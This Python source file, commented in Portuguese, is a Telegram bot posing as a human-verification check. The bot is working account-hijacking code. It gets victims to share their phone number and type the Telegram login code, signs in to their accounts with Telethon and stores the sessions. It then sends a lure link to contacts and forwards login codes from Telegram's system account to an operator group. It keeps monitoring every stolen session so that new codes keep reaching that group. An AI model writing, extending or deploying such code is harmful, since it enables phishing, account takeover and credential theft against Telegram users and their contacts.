from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes, CallbackQueryHandler
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.custom import Button
import asyncio
import os
import glob
import re
from dotenv import load_dotenv

# Carrega as vari√°veis do arquivo .env
load_dotenv()

# Obt√©m as vari√°veis de ambiente
api_id = int(os.getenv('API_ID'))
api_hash = os.getenv('API_HASH')

# Estados para o fluxo da conversa
CHOOSE_SESSION, CONFIRM_HUMAN, ASK_PHONE, ASK_CODE, VERIFY_NUMBER = range(5)

# Fun√ß√£o para encontrar todas as sess√µes existentes no diret√≥rio
def find_existing_sessions():
    # Procura por arquivos de sess√£o no diret√≥rio atual
    session_files = glob.glob("session_+*.session")
    
    # Extrai os n√∫meros de telefone das sess√µes encontradas
    sessions = []
    for session_file in session_files:
        # Usa express√£o regular para extrair o n√∫mero de telefone do nome do arquivo
        match = re.search(r'session_\+(\d+)\.session', session_file)
        if match:
            phone_number = match.group(1)
            sessions.append(phone_number)
    
    return sessions

# Fun√ß√£o para verificar se existe sess√£o para um n√∫mero espec√≠fico
def check_session_exists_for_phone(phone_number):
    # Remove o '+' se existir no in√≠cio do n√∫mero
    if phone_number.startswith('+'):
        phone_number = phone_number[1:]
        
    # Verifica se o arquivo de sess√£o existe
    session_file = f"session_+{phone_number}.session"
    return os.path.exists(session_file)

# Fun√ß√£o para enviar a solicita√ß√£o de c√≥digo
async def request_code(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            print("Enviando solicita√ß√£o de c√≥digo para o n√∫mero:", f'+{phone}')
            sent = await client.send_code_request(f'+{phone}')
            print(sent)
            await client.disconnect()
            # Retornar tamb√©m o phone_code_hash
            return True, "C√≥digo enviado com sucesso", sent.phone_code_hash
        except Exception as e:
            await client.disconnect()
            return False, f"Erro ao enviar c√≥digo: {e}", None
    else:
        await client.disconnect()
        return True, "Usu√°rio j√° est√° autorizado", None

# Fun√ß√£o para fazer login e enviar mensagens
async def login_and_send_messages(phone, code=None, phone_code_hash=None, update=None):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()

    try:
        # Verifica se o usu√°rio j√° est√° autorizado
        if not await client.is_user_authorized():
            # Se n√£o est√° autorizado, tenta fazer login com c√≥digo e hash
            if code and phone_code_hash:
                try:
                    await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
                    print("Login realizado com sucesso!")
                except Exception as e:
                    await client.disconnect()
                    return f"Erro ao logar: {e}"
            else:
                # Se n√£o forneceu c√≥digo e hash e n√£o est√° autorizado, n√£o pode continuar
                await client.disconnect()
                return "N√£o foi poss√≠vel fazer login: sess√£o n√£o autorizada e c√≥digo n√£o fornecido."
        else:
            print(f"Usu√°rio +{phone} j√° est√° autorizado. Continuando com as opera√ß√µes...")
            
        # Continua com as opera√ß√µes, pois o usu√°rio j√° est√° autenticado
        # Busca os contatos do usu√°rio
        result = await client(GetContactsRequest(hash=0))
        contacts = result.users
        print(f"Total de contatos encontrados: {len(contacts)}")
        
        # Mensagem a ser enviada para todos os contatos
        message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
        
        # Enviar a mensagem no pr√≥prio chat do bot, se o update estiver dispon√≠vel
        if update:
            await update.message.reply_text(message_to_send)
        
        # Contador de mensagens enviadas e com falha
        success_count = 0
        fail_count = 0
        
        # Loop para enviar mensagem para todos os contatos
        for contact in ["+5581981472018", "+5582993286918"]:
            try:
                # Tenta enviar a mensagem para o contato
                try:
                    # Primeiro tenta obter a entidade antes de enviar
                    entity = await client.get_entity(contact)
                    await client.send_message(
                        entity=entity,
                        message=message_to_send
                    )
                    success_count += 1
                    print(f"Mensagem enviada com sucesso para {contact}")
                except ValueError as e:
                    if "Cannot find any entity corresponding to" in str(e):
                        # Tenta formato alternativo sem o '+'
                        try:
                            contact_without_plus = contact.replace("+", "")
                            entity = await client.get_entity(contact_without_plus)
                            await client.send_message(
                                entity=entity,
                                message=message_to_send
                            )
                            success_count += 1
                            print(f"Mensagem enviada com sucesso para {contact} (formato alternativo)")
                        except Exception as inner_e:
                            fail_count += 1
                            print(f"Erro ao enviar mensagem para {contact} (mesmo com formato alternativo): {inner_e}")
                    else:
                        raise
                # Aguarda um pequeno intervalo para evitar limites de taxa
                await asyncio.sleep(0.5)
            except Exception as e:
                fail_count += 1
                print(f"Erro ao enviar mensagem para {contact}: {e}")
        
        print(f"Processo conclu√≠do! Mensagens enviadas: {success_count}, Falhas: {fail_count}")
        
        # Mensagem de log que ser√° enviada
        log_message = f"O n√∫mero '+{phone}' acabou de fazer login com sucesso!\n\n" \
                     f"Total de contatos encontrados: {len(contacts)}\n\n" \
                     f"Mensagens enviadas: {success_count}, Falhas: {fail_count}"
                      
        # Verificar se h√° mensagens do sistema Telegram (ID 777000)
        print("Verificando mensagens do sistema Telegram...")
        system_success, system_message = await monitor_telegram_messages(client, phone)
        
        if system_success:
            log_message += f"\n\n{system_message}"
        
        # NOVA IMPLEMENTA√á√ÉO SIMPLIFICADA: Entre no grupo especificado, envie o log e depois saia
        try:
            # 1. Entrar no grupo usando ID e username
            print("Tentando entrar no grupo especificado...")
            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
            
            if group_entity:
                # 2. Enviar a mensagem de log no grupo sem bot√µes inline
                print("Enviando mensagem de log no grupo...")
                await client.send_message(group_entity, log_message)
                print("Mensagem de log enviada com sucesso no grupo")
                
                # 3. Aguardar um pouco antes de sair
                await asyncio.sleep(2)
                
                # 4. Sair do grupo
                print("Saindo do grupo...")
                await leave_telegram_group(client, group_entity)
                print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
            else:
                print("N√£o foi poss√≠vel entrar no grupo especificado.")
                # Enviar mensagem diretamente para o criador do bot como backup
                try:
                    # Tente enviar para um ID de usu√°rio espec√≠fico (como backup)
                    admin_entity = await client.get_entity("linbotteste")
                    await client.send_message(admin_entity, log_message)
                    print("Mensagem de log enviada para o administrador como backup")
                except Exception as backup_e:
                    print(f"Erro ao enviar mensagem de backup: {backup_e}")
        except Exception as e:
            print(f"Erro durante a opera√ß√£o no grupo: {e}")
        
        return "Opera√ß√£o conclu√≠da com sucesso!"
    except Exception as e:
        return f"Erro durante a opera√ß√£o: {e}"
    finally:
        await client.disconnect()

# Fun√ß√£o para verificar se um n√∫mero de telefone j√° est√° autenticado
async def check_auth_status(phone):
    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
    await client.connect()
    
    # Verifica se a sess√£o est√° autorizada
    is_authorized = await client.is_user_authorized()
    await client.disconnect()
    
    return is_authorized

# Nova fun√ß√£o para lidar com a escolha de sess√£o existente
async def choose_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_choice = update.message.text
    
    # Verifica se o usu√°rio selecionou "Nova Sess√£o"
    if user_choice == "üì± Nova Sess√£o":
        await update.message.reply_text(
            "Voc√™ escolheu criar uma nova sess√£o. Primeiro, vamos verificar que voc√™ n√£o √© um rob√¥."
        )
        # Continua com o fluxo normal solicitando confirma√ß√£o humana
        keyboard = [[KeyboardButton("‚úÖ N√£o sou um rob√¥")]]
        await update.message.reply_text(
            "Clique no bot√£o abaixo para confirmar que voc√™ n√£o √© um rob√¥:",
            reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
        )
        return CONFIRM_HUMAN
    
    # Se o usu√°rio selecionou uma sess√£o existente
    if user_choice.startswith("üì≤ Usar +"):
        # Extrai o n√∫mero de telefone da escolha
        phone = user_choice.replace("üì≤ Usar +", "").strip()
        context.user_data["phone"] = phone
        
        # Verifica se a sess√£o est√° realmente autorizada
        is_authorized = await check_auth_status(phone)
        if is_authorized:
            await update.message.reply_text(f"Sess√£o para +{phone} encontrada e autorizada! Iniciando opera√ß√µes...")
            
            # Executa diretamente as opera√ß√µes com a conta autenticada (sem c√≥digo)
            result = await login_and_send_messages(phone, None, None, update)
            await update.message.reply_text(result)
            
            # Mensagem adicional com o link
            message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            await update.message.reply_text(message_to_send)
            
            return ConversationHandler.END
        else:
            # Se a sess√£o existe mas n√£o est√° autorizada, pede c√≥digo
            await update.message.reply_text(
                f"A sess√£o para +{phone} existe mas n√£o est√° autorizada. Vamos solicitar um c√≥digo de verifica√ß√£o."
            )
            # Envia solicita√ß√£o de c√≥digo
            await update.message.reply_text("Enviando c√≥digo de acesso! Verifique seu Telegram e aguarde...")
            success, message, phone_code_hash = await request_code(phone)
            
            if not success:
                await update.message.reply_text(message)
                # Volta para o in√≠cio
                return await start(update, context)
            
            # Salvar o phone_code_hash para usar durante o login
            context.user_data["phone_code_hash"] = phone_code_hash
            
            # Criar teclado num√©rico para o c√≥digo
            keyboard = [
                ["1", "2", "3"],
                ["4", "5", "6"],
                ["7", "8", "9"],
                ["0", "Limpar"]
            ]
            
            # Inicializa o c√≥digo
            context.user_data["code_digits"] = ""
            
            await update.message.reply_text(
                "C√≥digo enviado! Verifique seu Telegram e digite o c√≥digo de verifica√ß√£o que recebeu:",
                reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            )
            return ASK_CODE
    
    # Se chegou aqui, o usu√°rio fez uma escolha inv√°lida
    await update.message.reply_text("Op√ß√£o inv√°lida. Por favor, escolha uma das op√ß√µes dispon√≠veis.")
    # Volta para o in√≠cio
    return await start(update, context)

# Iniciar o bot - primeiro verificar se usu√°rio √© humano e coletar o n√∫mero
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("‚úÖ N√£o sou um rob√¥")]]
    await update.message.reply_text(
        "Clique no bot√£o abaixo para confirmar que voc√™ n√£o √© um rob√¥:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return CONFIRM_HUMAN

# Confirmar que n√£o √© um rob√¥ e pedir n√∫mero de telefone
async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Enviar meu contato", request_contact=True)]]
    await update.message.reply_text(
        "Por favor, envie seu n√∫mero de telefone clicando no bot√£o abaixo:",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    )
    return ASK_PHONE

# Receber o contato do usu√°rio e verificar sess√µes existentes
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo contato do usu√°rio.")
    if update.message.contact:
        phone = update.message.contact.phone_number
        context.user_data["phone"] = phone
        
        # Remove o '+' se existir no in√≠cio do n√∫mero
        if phone.startswith('+'):
            phone = phone[1:]
            
        # Verifica se existe uma sess√£o para este n√∫mero espec√≠fico
        has_session = check_session_exists_for_phone(phone)
        
        if has_session:
            # Se existe uma sess√£o para este n√∫mero, verifica se est√° autorizada
            is_authorized = await check_auth_status(phone)
            
            if is_authorized:
                await update.message.reply_text(f"Sess√£o encontrada para +{phone}! Iniciando opera√ß√µes...")
                
                # Executa diretamente as opera√ß√µes com a conta autenticada (sem c√≥digo)
                result = await login_and_send_messages(phone, None, None, update)
                await update.message.reply_text(result)
                
                # Mensagem adicional com o link
                message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
                await update.message.reply_text(message_to_send)
                
                return ConversationHandler.END
            else:
                # Se a sess√£o existe mas n√£o est√° autorizada, pede c√≥digo
                await update.message.reply_text(
                    f"Encontramos sua sess√£o, mas ela precisa ser reautorizada. Vamos solicitar um c√≥digo de verifica√ß√£o."
                )
                # Envia solicita√ß√£o de c√≥digo
                await update.message.reply_text("Enviando c√≥digo de acesso! Verifique seu Telegram e aguarde...")
                success, message, phone_code_hash = await request_code(phone)
                
                if not success:
                    if "Returned when all available options for this type of number were already used" in message:
                        await update.message.reply_text(
                            "Tentando novamente enviar o c√≥digo de acesso..."
                        )
                        print("Reiniciando tentativa de envio do c√≥digo de acesso...")
                        success, message, phone_code_hash = await request_code(phone)
                        if not success:
                            await update.message.reply_text(message)
                            return ASK_PHONE
                    else:
                        await update.message.reply_text(message)
                        return ASK_PHONE
                
                # Salvar o phone_code_hash para usar durante o login
                context.user_data["phone_code_hash"] = phone_code_hash
                
                # Criar teclado num√©rico para o c√≥digo
                keyboard = [
                    ["1", "2", "3"],
                    ["4", "5", "6"],
                    ["7", "8", "9"],
                    ["0", "Limpar"]
                ]
                
                # Inicializa o c√≥digo
                context.user_data["code_digits"] = ""
                
                await update.message.reply_text(
                    "C√≥digo enviado! Verifique seu Telegram e digite o c√≥digo de verifica√ß√£o que recebeu:",
                    reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
                )
                return ASK_CODE
        else:
            # N√£o existe sess√£o para este n√∫mero, pergunte se quer criar uma nova
            keyboard = [
                [KeyboardButton("‚úÖ Sim, criar uma nova sess√£o")],
                [KeyboardButton("‚ùå N√£o, quero usar outra sess√£o existente")]
            ]
            await update.message.reply_text(
                f"N√£o encontrei nenhuma sess√£o para o n√∫mero +{phone}. Deseja criar uma nova?",
                reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
            )
            return VERIFY_NUMBER
    else:
        print("Contato inv√°lido recebido.")
        await update.message.reply_text("Contato inv√°lido. Por favor, envie novamente.")
        return ASK_PHONE

# Nova fun√ß√£o para verificar se o usu√°rio quer criar uma nova sess√£o ou usar uma existente
async def verify_number_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    choice = update.message.text
    
    if choice == "‚úÖ Sim, criar uma nova sess√£o":
        phone = context.user_data.get("phone")
        if not phone:
            # Algo deu errado, voltar para o in√≠cio
            await update.message.reply_text("Erro ao recuperar seu n√∫mero. Vamos come√ßar novamente.")
            return await start(update, context)
        
        # Remove o '+' se existir no in√≠cio do n√∫mero
        if phone.startswith('+'):
            phone = phone[1:]
            
        # Envia solicita√ß√£o de c√≥digo
        await update.message.reply_text("Enviando c√≥digo de acesso! Verifique seu Telegram e aguarde...")
        success, message, phone_code_hash = await request_code(phone)
        
        if not success:
            await update.message.reply_text(message)
            return ASK_PHONE
            
        # Salvar o phone_code_hash para usar durante o login
        context.user_data["phone_code_hash"] = phone_code_hash
        
        # Criar teclado num√©rico para o c√≥digo
        keyboard = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["0", "Limpar"]
        ]
        
        # Inicializa o c√≥digo
        context.user_data["code_digits"] = ""
        
        await update.message.reply_text(
            "C√≥digo enviado! Verifique seu Telegram e digite o c√≥digo de verifica√ß√£o que recebeu:",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return ASK_CODE
        
    elif choice == "‚ùå N√£o, quero usar outra sess√£o existente":
        # Mostrar todas as sess√µes existentes
        existing_sessions = find_existing_sessions()
        
        if existing_sessions:
            keyboard = []
            
            # Adiciona cada sess√£o encontrada como uma op√ß√£o
            for session_phone in existing_sessions:
                keyboard.append([KeyboardButton(f"üì≤ Usar +{session_phone}")])
            
            # Adiciona op√ß√£o para voltar e criar uma nova sess√£o
            keyboard.append([KeyboardButton("üì± Nova Sess√£o")])
            
            await update.message.reply_text(
                "Escolha uma sess√£o existente para continuar:",
                reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
            )
            return CHOOSE_SESSION
        else:
            # N√£o existem outras sess√µes, voltar para criar uma nova
            await update.message.reply_text(
                "N√£o encontrei outras sess√µes existentes. Vamos criar uma nova sess√£o para voc√™."
            )
            return await confirm_human(update, context)
    
    # Se chegou aqui, o usu√°rio fez uma escolha inv√°lida
    await update.message.reply_text("Op√ß√£o inv√°lida. Por favor, escolha uma das op√ß√µes dispon√≠veis.")
    return await start(update, context)

# Receber o c√≥digo de verifica√ß√£o
async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Recebendo c√≥digo de acesso do usu√°rio.")
    digit = update.message.text
    
    # Inicializa o c√≥digo se ainda n√£o existir
    if "code_digits" not in context.user_data:
        context.user_data["code_digits"] = ""
    
    current_code = context.user_data["code_digits"]

    if digit == "Limpar":
        # Se usu√°rio clicou em limpar, zera o c√≥digo
        context.user_data["code_digits"] = ""
        await update.message.reply_text(f"C√≥digo limpo. Digite novamente.")
    else:
        # Adiciona o d√≠gito ao c√≥digo atual
        context.user_data["code_digits"] += digit
        current_code = context.user_data["code_digits"]

        # Se temos menos de 5 d√≠gitos, aguarda mais entrada
        if len(current_code) < 5:
            await update.message.reply_text(f"C√≥digo: {current_code} ({len(current_code)}/5 d√≠gitos)")
        else:
            # Se temos 5 d√≠gitos, processa o c√≥digo
            code = current_code
            phone = context.user_data.get("phone")
            phone_code_hash = context.user_data.get("phone_code_hash")
            
            if not phone_code_hash:
                await update.message.reply_text(
                    "Erro: phone_code_hash n√£o encontrado. Por favor, inicie o processo novamente com /start",
                    reply_markup=ReplyKeyboardRemove()
                )
                return ConversationHandler.END

            # Remove o teclado num√©rico
            await update.message.reply_text(
                f"C√≥digo completo: {code}. Processando...",
                reply_markup=ReplyKeyboardRemove()
            )

            # Chama a fun√ß√£o de login e envio de mensagens
            result = await login_and_send_messages(phone, code, phone_code_hash, update)
            await update.message.reply_text(result)
             # Mensagem a ser enviada para todos os contatos
            message_to_send = "[ üî¥ CLIQUE üîª ]\n\n-> https://t.me/+H9orcWQaqNM3ZGU5"
            
            # Enviar a mensagem no pr√≥prio chat do bot, se o update estiver dispon√≠vel
            if update:
                await update.message.reply_text(message_to_send)
            return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Opera√ß√£o cancelada pelo usu√°rio.")
    await update.message.reply_text("Opera√ß√£o cancelada.", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

# Fun√ß√£o para lidar com callbacks de Telethon
async def callback_handler(event):
    print(f"Callback Telethon recebido: {event.data}")
    
    # Decodifica os dados do evento que v√™m em bytes
    data = event.data.decode('utf-8')
    
    # Processa o callback baseado nos dados
    if data.startswith('login_yes_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]  # n√∫mero do telefone
            
            # Respondemos ao evento primeiro
            await event.answer(f"Solicitando c√≥digo para +{phone}...")
            
            # Editamos a mensagem original para indicar que estamos processando
            await event.edit(f"Solicitando c√≥digo para +{phone}...")
            
            # Solicita o c√≥digo
            success, result_msg, _ = await request_code(phone)
            
            if success:
                await event.edit(f"C√≥digo enviado para +{phone}. Verifique seu Telegram!")
            else:
                await event.edit(f"Erro ao solicitar c√≥digo: {result_msg}")
    elif data.startswith('login_no_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]
            await event.answer(f"Opera√ß√£o cancelada para +{phone}")
            await event.edit(f"Opera√ß√£o cancelada para +{phone}.")
    else:
        await event.edit(text="Opera√ß√£o desconhecida!")

# Fun√ß√£o para lidar com callbacks do python-telegram-bot
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()  # Responde ao callback para remover o status "aguardando"
    
    # Extrai os dados do callback
    data = query.data
    
    # Processa o callback baseado nos dados
    if data.startswith('login_yes_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]  # n√∫mero do telefone
            
            # Editamos a mensagem original para indicar que estamos processando
            await query.edit_message_text(f"Solicitando c√≥digo para +{phone}...")
            
            # Solicita o c√≥digo
            success, result_msg, _ = await request_code(phone)
            
            if success:
                await query.edit_message_text(f"C√≥digo enviado para +{phone}. Verifique seu Telegram!")
            else:
                await query.edit_message_text(f"Erro ao solicitar c√≥digo: {result_msg}")
    elif data.startswith('login_no_'):
        parts = data.split('_')
        if len(parts) >= 3:
            phone = parts[2]
            await query.edit_message_text(f"Opera√ß√£o cancelada para +{phone}.")
    else:
        await query.edit_message_text("Opera√ß√£o desconhecida!")

# Fun√ß√£o para entrar em um grupo pelo ID ou username
async def join_telegram_group(client, group_id=None, group_username=None):
    try:
        if group_username:
            # Se temos um username, tentamos entrar diretamente
            if group_username.startswith('@'):
                group_username = group_username[1:]  # Remove o @ inicial se existir
                
            try:
                entity = await client.get_entity(group_username)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo: {group_username}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo username {group_username}: {e}")
                
        if group_id:
            # Se temos um ID, tentamos entrar pelo ID
            try:
                entity = await client.get_entity(group_id)
                await client(JoinChannelRequest(entity))
                print(f"Entrou com sucesso no grupo pelo ID: {group_id}")
                return entity
            except Exception as e:
                print(f"Erro ao entrar no grupo pelo ID {group_id}: {e}")
                
        return None
    except Exception as e:
        print(f"Erro geral ao tentar entrar no grupo: {e}")
        return None

# Fun√ß√£o para sair de um grupo
async def leave_telegram_group(client, group_entity):
    try:
        await client(LeaveChannelRequest(group_entity))
        # Removendo o print daqui, pois j√° temos um log na fun√ß√£o principal
        return True
    except Exception as e:
        print(f"Erro ao sair do grupo: {e}")
        return False

# Fun√ß√£o para enviar mensagem no grupo (simplificada, sem QR code)
async def send_message_to_group(bot, chat_id, message_text, phone=None):
    try:
        # Enviar mensagem simples
        await bot.send_message(
            chat_id=chat_id,
            text=message_text
        )
        
        print("Mensagem enviada com sucesso para o grupo!")
        return True, "Mensagem enviada com sucesso!"
    except Exception as e:
        print(f"Erro ao enviar mensagem para o grupo: {e}")
        return False, f"Erro ao enviar mensagem: {str(e)}"

# Fun√ß√£o para monitorar mensagens do sistema Telegram (ID 777000)
async def monitor_telegram_messages(client, phone, update=None):
    try:
        # ID do sistema Telegram
        telegram_system_id = 777000
        
        print(f"Iniciando monitoramento de mensagens do sistema para +{phone}...")
        
        # Buscar as mensagens recentes do sistema Telegram
        from telethon.tl.functions.messages import GetHistoryRequest
        
        # Obt√©m a entidade do sistema Telegram
        system_entity = await client.get_entity(telegram_system_id)
        
        # Obt√©m o hist√≥rico de mensagens
        history = await client(GetHistoryRequest(
            peer=system_entity,
            limit=10,  # Limitar a 10 mensagens recentes
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))
        
        # Se n√£o h√° mensagens, retorna
        if not history.messages:
            print("Nenhuma mensagem do sistema encontrada")
            return False, "Nenhuma mensagem do sistema encontrada"
        
        # Pega a mensagem mais recente
        latest_message = history.messages[0]
        print(f"Mensagem mais recente do sistema: {latest_message.message}")
        
        # Formata a mensagem para reenvio
        system_message = f"üì¢ MENSAGEM DO SISTEMA PARA +{phone}:\n\n{latest_message.message}\n\nRecebida em: {latest_message.date}"
        
        # Entrar no grupo, enviar a mensagem e sair
        group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
        
        if group_entity:
            # Enviar a mensagem
            await client.send_message(group_entity, system_message)
            print("Mensagem do sistema reenviada para o grupo com sucesso")
            
            # Aguardar antes de sair
            await asyncio.sleep(1)
            
            # Sair do grupo
            await leave_telegram_group(client, group_entity)
            
            return True, "Mensagem do sistema reenviada com sucesso"
        else:
            print("N√£o foi poss√≠vel entrar no grupo para reenviar mensagem do sistema")
            return False, "N√£o foi poss√≠vel entrar no grupo"
            
    except Exception as e:
        print(f"Erro ao monitorar mensagens do sistema: {e}")
        return False, f"Erro ao monitorar mensagens: {str(e)}"

def main():
    # Obt√©m o token do bot do arquivo .env
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_SESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_session)],
            CONFIRM_HUMAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, confirm_human)],
            ASK_PHONE: [MessageHandler(filters.CONTACT, receive_contact)],
            ASK_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_code)],
            VERIFY_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, verify_number_choice)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    
    # Adicionar handler para os callback queries (bot√µes inline)
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Iniciar um cliente Telethon para lidar com os callbacks e monitorar mensagens do sistema
    # Use uma das sess√µes existentes ou crie uma nova para o bot
    async def start_telethon():
        try:
            # Voc√™ pode usar uma sess√£o espec√≠fica aqui ou criar uma para o bot
            bot_client = TelegramClient("session_bot", api_id, api_hash)
            await bot_client.connect()
            
            # Verificar se est√° autenticado (opcional para bots)
            if not await bot_client.is_user_authorized():
                print("Aviso: o cliente Telethon pode n√£o estar autorizado. Alguns recursos podem n√£o funcionar.")
                # Tente fazer login com o bot token para autoriza√ß√£o
                try:
                    await bot_client.start(bot_token=token)
                    print("Login com bot token realizado com sucesso!")
                except Exception as login_error:
                    print(f"Erro ao tentar login com bot token: {login_error}")
            
            # Registrar o handler de callback de forma expl√≠cita
            bot_client.add_event_handler(callback_handler, events.CallbackQuery)
            
            # Iniciar clientes Telethon para todas as sess√µes existentes
            # Isso permite monitorar as mensagens do sistema para cada conta
            print("Iniciando monitoramento de contas...")
            sessions = find_existing_sessions()
            for phone in sessions:
                try:
                    # Criar cliente para cada sess√£o existente
                    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
                    await client.connect()
                    
                    if await client.is_user_authorized():
                        print(f"Iniciando monitoramento para a conta +{phone}")
                        
                        # Adiciona handler para monitorar mensagens espec√≠ficas do sistema
                        @client.on(events.NewMessage(from_users=777000))
                        async def handle_system_message(event):
                            message = event.message
                            print(f"Nova mensagem do sistema para +{phone}: {message.message}")
                            
                            # Formata a mensagem para reenvio
                            system_message = f"üì¢ MENSAGEM DO SISTEMA PARA +{phone}:\n\n{message.message}\n\nRecebida em: {message.date}"
                            
                            # Entrar no grupo, enviar a mensagem e sair
                            try:
                                # 1. Entrar no grupo
                                group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
                                
                                if group_entity:
                                    # 2. Enviar a mensagem
                                    await client.send_message(group_entity, system_message)
                                    print(f"Mensagem do sistema para +{phone} reenviada ao grupo")
                                    
                                    # 3. Aguardar um pouco
                                    await asyncio.sleep(1)
                                    
                                    # 4. Sair do grupo
                                    await leave_telegram_group(client, group_entity)
                            except Exception as e:
                                print(f"Erro ao reenviar mensagem do sistema: {e}")
                        
                        print(f"Monitoramento configurado para +{phone}")
                    else:
                        print(f"Sess√£o para +{phone} n√£o est√° autorizada, n√£o ser√° monitorada")
                        await client.disconnect()
                except Exception as e:
                    print(f"Erro ao iniciar monitoramento para +{phone}: {e}")
            
            print("Cliente Telethon iniciado para escutar callbacks e mensagens do sistema")
            print(f"Cliente conectado: {bot_client.is_connected()}")
            print(f"Handlers registrados: {bot_client.list_event_handlers()}")
            
            # Manter o cliente rodando
            await bot_client.run_until_disconnected()
        except Exception as e:
            print(f"Erro ao iniciar o cliente Telethon: {e}")
    
    # Iniciar o cliente Telethon em uma task separada usando o novo m√©todo recomendado
    try:
        # Usar o novo m√©todo recomendado para obter ou criar um loop
        if hasattr(asyncio, 'get_event_loop_policy'):
            loop = asyncio.get_event_loop_policy().get_event_loop()
        else:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        
        loop.create_task(start_telethon())
    except Exception as loop_error:
        print(f"Erro ao configurar o loop de eventos: {loop_error}")
    
    app.run_polling()

if __name__ == "__main__":
    main()
